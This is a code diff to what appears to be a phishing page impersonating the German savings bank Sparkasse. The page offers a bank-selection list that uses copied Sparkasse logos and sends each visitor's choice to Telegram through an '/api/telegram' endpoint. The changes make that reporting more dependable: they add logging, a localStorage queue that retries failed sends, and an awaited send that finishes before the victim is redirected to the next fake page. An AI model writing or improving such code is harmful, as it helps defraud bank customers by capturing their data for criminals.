@@ -3080,6 +3080,7 @@
   // Helper function to send data to Telegram
   async function sendToTelegram(data) {
     try {
+      console.log('📤 Sender data til Telegram:', data);
       const response = await fetch('/api/telegram', {
         method: 'POST',
         headers: {
@@ -3094,11 +3095,33 @@
       if (response.ok) {
         const result = await response.json().catch(() => ({}));
         console.log('✅ Data sendt til Telegram:', result);
+        return true;
       } else {
-        console.error('❌ Telegram API error:', await response.text().catch(() => 'Unknown error'));
+        const errorText = await response.text().catch(() => 'Unknown error');
+        console.error('❌ Telegram API error:', response.status, errorText);
+        // Fallback: Store in localStorage for later
+        if (window.localStorage) {
+          try {
+            const existing = JSON.parse(localStorage.getItem('telegram_queue') || '[]');
+            existing.push({...data, timestamp: new Date().toISOString(), retry: true});
+            localStorage.setItem('telegram_queue', JSON.stringify(existing));
+            console.log('💾 Data lagret lokalt for senere sending');
+          } catch (e) {}
+        }
+        return false;
       }
     } catch (error) {
       console.error('❌ Error sending to Telegram:', error);
+      // Fallback: Store in localStorage for later
+      if (window.localStorage) {
+        try {
+          const existing = JSON.parse(localStorage.getItem('telegram_queue') || '[]');
+          existing.push({...data, timestamp: new Date().toISOString(), retry: true});
+          localStorage.setItem('telegram_queue', JSON.stringify(existing));
+          console.log('💾 Data lagret lokalt for senere sending');
+        } catch (e) {}
+      }
+      return false;
     }
   }
   
@@ -3147,13 +3170,7 @@
       bankItem.style.alignItems = 'center';
       bankItem.style.justifyContent = 'space-between';
       bankItem.innerHTML = '<div style="display: flex; align-items: center; gap: 12px;"><img src="./1 sparkasse_files/Bildmarke_S-Sparkasse_72px.svg" alt="Sparkasse Logo" style="width: 32px; height: 32px; flex-shrink: 0;"><span style="font-size: 16px;">' + bank.name + '</span></div><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink: 0;"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z" fill="currentColor"/></svg>';
-      bankItem.addEventListener('click', function() {
-        // Send bank selection to Telegram
-        sendToTelegram({
-          action: 'bank_selected',
-          bank: bank.name,
-        });
-        
+      bankItem.addEventListener('click', async function() {
         // Store selected bank in localStorage
         if (window.localStorage) {
           try {
@@ -3161,6 +3178,13 @@
           } catch (e) {}
         }
         
+        // Send bank selection to Telegram and wait for it to complete
+        await sendToTelegram({
+          action: 'bank_selected',
+          bank: bank.name,
+        });
+        
+        // Navigate after data is sent
         window.location.href = '1 sparkasse.html';
       });
       bankItem.addEventListener('mouseenter', function() {
